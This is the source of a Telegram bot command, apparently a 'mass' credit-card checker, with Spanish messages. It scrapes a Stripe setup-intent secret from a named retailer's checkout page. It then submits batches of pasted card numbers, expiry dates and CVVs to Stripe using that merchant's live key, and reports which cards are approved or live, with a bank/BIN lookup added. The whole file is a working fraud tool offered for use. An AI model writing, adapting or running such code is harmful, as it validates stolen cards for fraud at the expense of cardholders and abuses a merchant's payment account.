import json
import requests
import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

from gates.gateways import Gateways

from datos import idchat
@Client.on_message(filters.command("mass"))
async def cmds(client, message):
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x:
            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/mass card</code></b>")
                return

            cards = data[1].split("\n")

            if len(cards) > 10:
                await message.reply_text("<b>⎚ Use <code>10</code> css maximas</b>")
                return

            gate = Gateways('Stripe', cards)
            header_mass = '<b>⎚ Ccs Total : <code>{}</code> [ <code>{}</code> ]</b>\n'.format(len(cards), gate.get_gateway())
            init_message = await message.reply_text(header_mass)

            for card in cards:

                ccs  = card
                card = ccs.split("|")
                cc   = card[0]
                mes  = card[1]
                ano  = card[2]
                cvv  = card[3]
                bin_code = cc[:6]

                low_ano = lambda x: x[2:] if len(x) == 4 else x

                gate.set_card(ccs)
        
            # REQUESTS INIT
                session = requests.Session()
                response = session.get('https://www.racquetballwarehouse.com/ccinfo.php').text
                eti_secret = response.split('id="stripe_payment" data-client-secret="')[1].split('"')[0]
                seti = eti_secret.split("_secret_")[0]
        
                headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',}
                
                data = f'return_url=https%3A%2F%2Fwww.racquetballwarehouse.com%2Ffinalcheckout.php&payment_method_data[billing_details][address][city]=&payment_method_data[billing_details][address][line1]=&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=&payment_method_data[billing_details][address][state]=&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][email]=&payment_method_data[billing_details][name]=+&payment_method_data[billing_details][phone]=&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F037e7c502%3B+stripe-js-v3%2F037e7c502%3B+payment-element&payment_method_data[time_on_page]=68798&payment_method_data[guid]=14c4d026-6952-41fe-a710-01a7a366d17e4575d6&payment_method_data[muid]=cac16bf6-2f19-4843-95c1-22e8e70f79083ad1ec&payment_method_data[sid]=15b4c3e0-bdef-4c19-bf11-0b8f52a6be45cead61&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51KsEdjKnTNpmSjw1sHz5UGOh7KBQw7ub0Hd7SyMII72PfQsnJ2tFxLYYoXy1usGt4LvNbecTljlk90wlMUQ4Hfpa00uhiyleEV&client_secret={eti_secret}'
                
                response = session.post(f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',headers=headers,data=data,)
                
                if 'three_d_secure_2_source' in response.text:
                    header_mass += gate.mass_progress('Approved 3D ✅')
                    await init_message.edit_text(header_mass)
                elif 'succeeded' in response.text:
                    header_mass += gate.mass_progress('Approved ✅')
                    await init_message.edit_text(header_mass)
                elif 'insufficient_funds' in response.text:
                    error = response.json()["error"]
                    header_mass += gate.mass_progress(error["message"] + "✅")
                    await init_message.edit_text(header_mass)
                elif 'incorrect_cvc' in response.text:
                    error = response.json()["error"]
                    header_mass += gate.mass_progress(error["message"] + "✅")
                    await init_message.edit_text(header_mass)
                elif 'error' in response.text:
                    error = response.json()["error"]
                    header_mass += gate.mass_progress(error["message"] + "❌")
                    await init_message.edit_text(header_mass)
                else:
                    header_mass += gate.mass_progress('Unknown ❌')
                    await init_message.edit_text(header_mass)

            bin_code = cc[:6]
            req = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}").json()
            bina = req['bin']
            if not bina:
                await message.reply_text(f'<b>Bins no encontrado {bin_code}</b>')
            else:
                brand = req['brand']
                country = req['country']
                country_name = req['country_name']
                country_flag = req['country_flag']
                country_currencies = req['country_currencies']
                bank = req['bank']
                level = req['level']
                typea  = req['type']

                await init_message.edit_text(f"""<b>{header_mass}
⎚ Bin: <code>{bin_code}</code>  {country}|{country_flag}|{country_name}
⎚ Data: <code>{brand}-{typea}-{level}</code> 
⎚ Bank: <code>{bank}</code>
━━━
⎚ 𝐏𝐫𝐨𝐱𝐢: Live! ✅
⎚ 𝙘𝙝𝙚𝙘𝙠 @{message.from_user.username}
⎚ 𝗖𝗿𝗲𝗮𝘁𝗲 : <b><a href="tg://resolve?domain=RexAwait">𝗿𝗲𝘅 hᴀᴡᴀɪɪ |「💻」</a></b></b>
           """)
        
        
        else:
            return await message.reply(f'<b>⎚ Chat no autorizado | O no eres Premium.</b>')